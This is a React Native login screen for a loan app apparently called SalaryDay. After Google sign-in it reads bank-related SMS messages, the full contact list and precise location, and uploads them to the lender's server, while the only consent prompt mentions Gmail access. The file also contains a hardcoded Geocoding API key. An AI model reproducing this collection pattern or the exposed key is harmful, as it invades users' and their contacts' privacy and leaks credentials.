import React, { useEffect, useState } from "react";
import {
  Linking,
  Platform,
  Pressable,
  StyleSheet,
  Text,
  View,
} from "react-native";
import { ScrollView } from "react-native-gesture-handler";
import ForwardArrow from "../../../assets/vectors/ForwardArrow";
import GoogleIcon from "../../../assets/vectors/GoogleIcon";
import LogoIcon from "../../../assets/vectors/LogoIcon";
import CircularIcon from "../../../components/global/CircularIcon";
import Icon from "../../../components/global/Icon";
import PageWrapper from "../../../components/global/PageWrapper";
import PlanCard from "../../../components/global/PlanCard";
import COLORS from "../../../constants/Colors";
import fontFamily from "../../../constants/FontFamily";
import STRINGS from "../../../constants/locale";
import { spacing } from "../../../constants/Spacing";
import { CommonActions, useNavigation } from "@react-navigation/native";
import Mail from "../../../assets/vectors/Mail";
import CustomModal from "../../../components/global/CustomModal";
import {
  GoogleSignin,
  statusCodes,
} from "@react-native-google-signin/google-signin";
import { useDispatch, useSelector } from "react-redux";
import Loader from "../../../components/global/FullScreenLoader";
import {
  getPlans,
  saveContacts,
  saveCustomerLocation,
  saveCustomerSMS,
  socialLogin,
} from "../../../services/api-services/api";
import {
  setAuthToken,
  setGeolocationAction,
  setUserGmailAccountAccessAction,
} from "../../../services/redux/action/actions";
import { userNavigationConfig, loanPlansColor } from "../../../utils";
import { setPlansAction } from "../../../services/redux/action/actions";
import {
  getAuthToken,
  getGmailAccountAccessDetails,
} from "../../../services/redux/selector/selector";
import {
  requestMultiple,
  PERMISSIONS,
  request,
} from "react-native-permissions";
import DeviceInfo from "react-native-device-info";
import VersionCheck from "react-native-version-check";
import Geolocation from "@react-native-community/geolocation";
import Geocoder from "react-native-geocoding";
import SmsAndroid from "react-native-get-sms-android";
import Contacts from "react-native-contacts";
import HappyFace from "../../../assets/vectors/HappyFace";
import SpInAppUpdates, {
  NeedsUpdateResponse,
  IAUUpdateKind,
  StartUpdateOptions,
} from "sp-react-native-in-app-updates";
const Login = () => {
  const inAppUpdates = new SpInAppUpdates(
    false // isDebug
  );
  const dispatch = useDispatch();
  const token = useSelector(getAuthToken);
  const [showModal, setShowModal] = useState<boolean>(false);
  const [buttonLoading, setButtonLoader] = useState<boolean>(false);
  const navigation = useNavigation();
  const [plansData, setPlansData] = useState([]);
  const gmailAccountAccess = useSelector(getGmailAccountAccessDetails);
  const getPlansData = async () => {
    const response = await getPlans(token);
    setPlansData(response?.data?.response?.plans);
    dispatch(setPlansAction(response?.data?.response?.plans));
  };
  const [contactListData, setContactListData] = useState<[]>([]);
  const [longitudeVal, setLongitudeVal] = useState<string>("");
  const [latitudeVal, setLatitudeVal] = useState<string>("");
  const [userAddress, setUserAddress] = useState<string>("");
  const [showErrorModal, setShowErrorModal] = useState<boolean>(false);
  const [showUpdateModal, setShowUpdateModal] = useState<boolean>(false);
  const [modalError, setErrorModal] = useState<string>("");
  const [userAuthToken, setUserAuthToken] = useState<any>();
  const [smsArray, setSMSArray] = useState<[]>([]);

  useEffect(() => {
    getPlansData();
    inAppUpdates.checkNeedsUpdate().then((result) => {
      console.log("checkNeedsUpdate", result);
      console.log("result.shouldUpdate111", result.shouldUpdate)
      if ( Platform.OS === "android") {
        console.log("result.shouldUpdate", result.shouldUpdate)
        result.shouldUpdate
          ? setShowUpdateModal(true)
          : setShowUpdateModal(false);
      }
    });
  }, []);
  const openModal = () => {
    setShowModal(true);
  };

  useEffect(() => {
    GoogleSignin.configure({
      iosClientId:
        "447444421026-cqs1f47vshpcemi267m25lsipo1ed5g8.apps.googleusercontent.com",
      webClientId:
        "447444421026-p4li6isn2hj9p0fgkhcrg13ked86vmcs.apps.googleusercontent.com",
      offlineAccess: true,
    });
  }, []);

  // const GoogleSingUp = async () => {
  //   const { idToken } = await GoogleSignin.signIn();
  //   const googleCredential = auth.GoogleAuthProvider.credential(idToken);
  //   return auth().signInWithCredential(googleCredential);
  // }

  const GoogleSingUp = async () => {
    setButtonLoader(true);
    try {
      await GoogleSignin.hasPlayServices();
      const userInfo = await GoogleSignin.signIn();
      setButtonLoader(false);
      if (userInfo) {
        getCords();
        const googleInfo = {
          first_name: userInfo?.user?.givenName,
          last_name: userInfo?.user?.familyName,
          email: userInfo?.user?.email,
          profile_image: null,
          access_token: userInfo?.user?.id,
        };

        const res = await socialLogin(googleInfo);
        // setButtonLoader(false);
        if (res.status == 200) {
          const data = res?.data?.response?.user;

          dispatch(setAuthToken(res.data.response.token));
          console.log(
            `Token>>>>>: ${res?.data?.response?.token}`,
            `Status>>>>>>: ${data?.status}`,
            `SubStatus>>>>>>: ${data?.sub_status}`
          );
          setShowModal(false);
          console.log(
            `UserNavigationConfig>>>>>: ${userNavigationConfig}>>${data?.status}_${data?.sub_status}`
          );

          const screenName =
            data?.status >= 6 || data?.sub_status >= 6
              ? "Dashboard"
              : userNavigationConfig[`${data?.status}_${data?.sub_status}`]
                .screen;
          const resetAction = CommonActions.reset({
            index: 0,
            routes: [{ name: screenName }],
          });
          {
            data?.status >= 6 || data?.sub_status >= 6
              ? (readCustomerSMS(),
                getContacts(),
                setTimeout(() => {
                  requestPermissions(res?.data?.response?.token);
                  navigation.dispatch(resetAction);
                  dispatch(setUserGmailAccountAccessAction(true));
                }, 1500))
              : (navigation.dispatch(resetAction),
                dispatch(setUserGmailAccountAccessAction(true)));
          }
        }
      }
    } catch (error: Record<string, string | number | undefined>) {
      if (error.code === statusCodes.SIGN_IN_CANCELLED) {
        // user cancelled the login flow
        setButtonLoader(false);
        console.log("User cancelled the login flow !");
      } else if (error.code === statusCodes.IN_PROGRESS) {
        console.log("Signin in progress");
        setButtonLoader(false);

        // operation (f.e. sign in) is in progress already
      } else if (error.code === statusCodes.PLAY_SERVICES_NOT_AVAILABLE) {
        console.log("Google play services not available or outdated !");
        setButtonLoader(false);

        // play services not available or outdated
      } else {
        setButtonLoader(false);
        console.log(error);
      }
    }
  };
  const requestPermissions = (userAuthToken: any) => {
    if (Platform.OS == "android") {
      requestMultiple([
        PERMISSIONS.ANDROID.CAMERA,
        PERMISSIONS.ANDROID.WRITE_EXTERNAL_STORAGE,
        PERMISSIONS.ANDROID.READ_CONTACTS,
        PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
        PERMISSIONS.ANDROID.READ_SMS,
      ]).then((statuses) => {
        if (
          statuses[PERMISSIONS.ANDROID.READ_SMS] == "granted" &&
          statuses[PERMISSIONS.ANDROID.WRITE_EXTERNAL_STORAGE] == "granted" &&
          statuses[PERMISSIONS.ANDROID.CAMERA] == "granted" &&
          statuses[PERMISSIONS.ANDROID.READ_CONTACTS] == "granted" &&
          statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION] == "granted"
        ) {
          saveLocation(userAuthToken);
          // saveInfoDevice();
          saveCustomerContact(userAuthToken);
          // setShowModal(true);
          // getUserAddress();
          readCustomerSMSData(smsArray, userAuthToken);
          console.log("final smsArray", smsArray);
        } else {
          console.log(statuses);
        }
      });
    } else {
      requestMultiple([
        PERMISSIONS.IOS.CAMERA,
        PERMISSIONS.IOS.CONTACTS,
        PERMISSIONS.IOS.PHOTO_LIBRARY,
        PERMISSIONS.IOS.LOCATION_WHEN_IN_USE,
      ]).then((statuses) => {
        if (
          statuses[PERMISSIONS.IOS.CAMERA] == "granted" &&
          statuses[PERMISSIONS.IOS.CONTACTS] == "granted" &&
          (statuses[PERMISSIONS.IOS.PHOTO_LIBRARY] == "granted" ||
            statuses[PERMISSIONS.IOS.PHOTO_LIBRARY] == "limited") &&
          statuses[PERMISSIONS.IOS.LOCATION_WHEN_IN_USE] == "granted"
        ) {
          // saveInfoDevice();
          saveLocation(userAuthToken);
          saveCustomerContact(userAuthToken);
          // setShowModal(true);
          // getUserAddress();
        } else {
          console.log(statuses);
        }
      });
    }
  };
  const readCustomerSMSData = async (messageArray: any, tokenData: any) => {
    let payload = {
      sms: messageArray,
    };
    console.log(" payload0", payload);

    const response = await saveCustomerSMS(payload, tokenData);
    console.log("readCustomerSMSData resss", response);
    if (response.data.success) {
      console.log("sms read true response", response.data.message);
    } else {
      console.log("sms read false responce", response.data.message);
    }
  };
  const saveLocation = async (tokenData: any) => {
    let payload = {
      lat: latitudeVal,
      long: longitudeVal,
      address: userAddress,
    };

    const response = await saveCustomerLocation(payload, tokenData);
    console.log("saveLocation response::", response);
    console.log("saveLocation response payload1", payload);

    if (response.data.success) {
      console.log("print true", response.data.message);
    } else {
      console.log("print else", response.data.message);
    }
  };
  const saveCustomerContact = async (tokenData: any) => {
    let payload = { contacts: contactListData };
    console.log(" payload2", payload);
    const response = await saveContacts(payload, tokenData);
    console.log("saveCustomerContact resss:", response);
    if (response.data.success) {
      console.log("print true", response.data.message);
    } else {
      console.log("print else", response.data.message);
    }
  };
  const getCords = async () => {
    request(
      Platform.OS == "android"
        ? PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION
        : PERMISSIONS.IOS.LOCATION_WHEN_IN_USE
    ).then(async (result: string) => {
      if (result == "granted") {
        await Geolocation.getCurrentPosition(
          //Will give you the current location
          (position) => {
            //getting the Longitude from the location json
            const currentLongitude = JSON.stringify(position.coords.longitude);

            //getting the Latitude from the location json
            const currentLatitude = JSON.stringify(position.coords.latitude);
            console.log("lat", currentLatitude);
            console.log("long", currentLongitude);
            setLatitudeVal(currentLatitude);
            setLongitudeVal(currentLongitude);
            getUserAddress(currentLatitude, currentLongitude);
            dispatch(
              setGeolocationAction({
                lon: currentLongitude,
                lat: currentLatitude,
              })
            );
          },
          (error) => {
            console.log("error.message", error.message);
            if (error.code == 2) {
            }
            setErrorModal(error.message);
            setShowErrorModal(true);
          },
          {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 1000,
          }
        );
      }
    });
  };
  const getContacts = async () => {
    let contactArr: any = [];
    request(
      Platform.OS == "android"
        ? PERMISSIONS.ANDROID.READ_CONTACTS
        : PERMISSIONS.IOS.CONTACTS
    ).then((result: string) => {
      if (result == "granted") {
        Contacts.getAll().then((contacts: any[]) => {
          contacts.forEach((element) => {
            if (element.phoneNumbers.length != 0) {
              contactArr.push({
                contact_name: element.givenName,
                contact_number: element.phoneNumbers[0].number,
              });
            }
          });
          setContactListData(contactArr);
          console.log("final contactArr", contactArr);
        });
        readCustomerSMS();
      } else {
        console.log("something went wrong");
      }
    });
  };

  useEffect(() => {
    Geocoder.init("AIzaSyDcuwvlqNt_Veup4YxeIQoMUDVK9ZrZaFE");
  }, []);
  const getUserAddress = async (latVal: any, lonVal: any) => {
    console.log(latVal, ",", lonVal);
    await Geocoder.from(latVal, lonVal)
      .then((json) => {
        var addressComponent = json.results[0].formatted_address;
        console.log("comp add", addressComponent);
        setUserAddress(addressComponent);
      })
      .catch((error) => {
        console.warn(error);
      });
  };
  const readCustomerSMS = async () => {
    var filter = {};
    if (Platform.OS == "android") {
      try {
        await request(
          Platform.OS == "android"
            ? PERMISSIONS.ANDROID.READ_SMS
            : PERMISSIONS.IOS.CONTACTS
        ).then((res) => {
          let permissionResult;
          if (res == "granted") {
            permissionResult = true;
          }
          if (permissionResult) {
            console.log("filter", filter);
            SmsAndroid.list(
              JSON.stringify(filter),

              (fail: string) => {
                console.log("Failed with this error: " + fail);
              },
              async (count: any, smsList: string) => {
                var arr = JSON.parse(smsList);
                var array: [] = [];
                for (let index = 0; index < arr.length; index++) {
                  const element = arr[index];
                  var body = element["body"] + "";
                  var checkBankOnly1 = body.includes("debited");
                  var checkBankOnly2 = body.includes("credited");
                  var checkBankOnly4 = body.includes("a/c");
                  if (
                    checkBankOnly1 == true ||
                    checkBankOnly2 == true ||
                    checkBankOnly4 == true
                  ) {
                    array.push({
                      sms_id: element["_id"],
                      address: element["address"],
                      body: element["body"],
                      creator: element["creator"],
                      date: moment(element["date"]).format("YYYY-MM-DD") + "",
                      date_sent:
                        moment(element["date_sent"]).format("YYYY-MM-DD") + "",
                      error_code: element["error_code"],
                      locked: element["locked"],
                      priority: element["priority"],
                      protocol: element["protocol"],
                      rcs_extra: element["rcs_extra"],
                      rcs_message_type: element["rcs_message_type"],
                      rcs_timestamp_delivered:
                        element["rcs_timestamp_delivered"],
                      rcs_timestamp_displayed:
                        element["rcs_timestamp_displayed"],
                      read: element["read"],
                      reply_path_present: element["reply_path_present"],
                      seen: element["seen"],
                      service_center: element["service_center"],
                      status: element["status"],
                      sub_id: element["sub_id"],
                      thread_id: element["thread_id"],
                      type: element["type"],
                    });
                    setSMSArray(array);
                  }
                }
              }
            );
          }
        });
      } catch (err) { }
    } else {
    }
  };
  return (
    <PageWrapper>
      <ScrollView
        showsVerticalScrollIndicator={false}
        contentContainerStyle={{ flex: 1 }}
      >
        <View style={{ marginLeft: spacing.m }}>
          <Icon icon={LogoIcon} />
          <Text style={styles.label}>{STRINGS.login.heading}</Text>
          <Text style={styles.subLabel}>{STRINGS.login.subHeading}</Text>
        </View>
        <View style={styles.container}>
          <Pressable
            style={styles.box}
            onPress={() => {
              gmailAccountAccess ? GoogleSingUp() : openModal();
            }}
          >
            <CircularIcon iconName={GoogleIcon} />
            <Text style={styles.title}>{STRINGS.login.title}</Text>
            <Icon icon={ForwardArrow} />
          </Pressable>
          <ScrollView
            horizontal={true}
            showsHorizontalScrollIndicator={false}
            automaticallyAdjustContentInsets={true}
          >
            <View style={{ flexDirection: "row", flex: 1 }}>
              {plansData?.map((item: any, index: number) => {
                return (
                  <PlanCard
                    customStyles={{ marginHorizontal: 15 }}
                    key={index}
                    days={item.plan_tenure ?? "---"}
                    minSalary={item.min_monthly_salary ?? "---"}
                    numOfEmi={item.no_of_emis ?? "---"}
                    primaryColor={loanPlansColor[item.plan_tenure].primaryColor}
                    secondaryColor={
                      loanPlansColor[item.plan_tenure].secondaryColor
                    }
                  />
                );
              })}
            </View>
          </ScrollView>
        </View>
      </ScrollView>
      <CustomModal
        buttonLoader={false}
        hideOnPress={() => {
          // setShowModal(false);
        }}
        onConfirm={() => {
          Linking.openURL(
            `http://play.google.com/store/apps/details?id=${DeviceInfo.getBundleId()}`
          );
        }}
        onDismiss={() => {
          // setShowModal(false);
        }}
        buttonLable={"Update"}
        primaryText={"Please go to the PlayStore and"}
        linkText={""}
        secondaryText={" Update the Latest Version."}
        iconName={HappyFace}
        isVisible={showUpdateModal}
      />
      <CustomModal
        buttonLoader={false}
        hideOnPress={() => {
          setShowModal(false);
        }}
        onConfirm={GoogleSingUp}
        onDismiss={() => {
          setShowModal(false);
        }}
        isButtonGroup={true}
        primaryText={"Allow "}
        linkText={"SalaryDay"}
        secondaryText={" to access \nGmail account on your \ndevice."}
        iconName={Mail}
        isVisible={showModal}
      />
      {buttonLoading && <Loader isVisible={buttonLoading} />}
    </PageWrapper>
  );
};
const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: COLORS.White,
  },
  title: {
    color: COLORS.Black,
    fontSize: 16,
    lineHeight: 24,
    fontFamily: fontFamily.LatoBold,
    marginLeft: -70,
  },
  box: {
    width: "85%",
    backgroundColor: COLORS.White,
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    borderRadius: 15,
    paddingHorizontal: spacing.s,
    paddingTop: spacing.s,
    paddingBottom: spacing.m,
    elevation: 10,
    marginTop: -30,
    alignSelf: "center",
    shadowColor: "#000000",
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.3,
    shadowRadius: 2,
  },
  label: {
    lineHeight: 30,
    color: COLORS.White,
    fontFamily: fontFamily.LatoBold,
    fontSize: 24,
    marginTop: spacing.sms,
  },
  subLabel: {
    lineHeight: 36,
    color: COLORS.White,
    fontFamily: fontFamily.LatoBold,
    fontSize: 16,
    marginBottom: 55,
  },
  image: {
    flex: 1,
    height: "100%",
    width: "100%",
    backgroundColor: COLORS.Transparent,
  },
});
export default Login;
